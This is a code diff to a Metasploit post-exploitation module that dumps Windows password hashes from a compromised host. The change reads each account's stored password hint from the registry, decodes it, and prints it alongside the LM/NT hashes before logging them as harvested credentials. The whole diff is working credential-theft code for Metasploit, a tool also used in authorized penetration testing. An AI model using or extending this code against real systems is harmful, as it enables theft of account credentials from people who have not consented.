@@ -140,6 +140,13 @@ class Metasploit3 < Msf::Post
 			users[usr.to_i(16)] ||={}
 			users[usr.to_i(16)][:F] = uk.query_value("F").data
 			users[usr.to_i(16)][:V] = uk.query_value("V").data
+			
+			begin
+				users[usr.to_i(16)][:UserPasswordHint] = uk.query_value("UserPasswordHint").data
+			rescue ::Rex::Post::Meterpreter::RequestError
+				users[usr.to_i(16)][:UserPasswordHint] = nil
+			end
+			
 			uk.close
 		end
 		ok.close
@@ -180,6 +187,16 @@ class Metasploit3 < Msf::Post
 		end
 
 		users
+	end
+	#-------------------------------------------------------------------------------
+
+	def decode_windows_hint(e_string)
+		d_string = ""
+		e_string.scan(/..../).each do |chunk|
+			bytes = chunk.scan(/../)
+			d_string += (bytes[1] + bytes[0]).to_s.hex.chr
+		end
+		d_string
 	end
 	#-------------------------------------------------------------------------------
 
@@ -279,7 +296,14 @@ class Metasploit3 < Msf::Post
 				# next if guest account or support account
 				next if rid == 501 or rid == 1001
 				collected_hashes << "#{users[rid][:Name]}:#{rid}:#{users[rid][:hashlm].unpack("H*")[0]}:#{users[rid][:hashnt].unpack("H*")[0]}:::\n"
-				print_good("\t#{users[rid][:Name]}:#{rid}:#{users[rid][:hashlm].unpack("H*")[0]}:#{users[rid][:hashnt].unpack("H*")[0]}:::")
+				
+				#If we have a hint, decode and populate hint_string
+				hint_string = ""
+				if !users[rid][:UserPasswordHint].nil?
+					hint_string += " (Hint: \"#{decode_windows_hint(users[rid][:UserPasswordHint].unpack("H*")[0])}\")"
+				end
+				
+				print_good("\t#{users[rid][:Name]}:#{rid}:#{users[rid][:hashlm].unpack("H*")[0]}:#{users[rid][:hashnt].unpack("H*")[0]}:::#{hint_string}")
 				session.framework.db.report_auth_info(
 					:host  => host,
 					:port  => @smb_port,
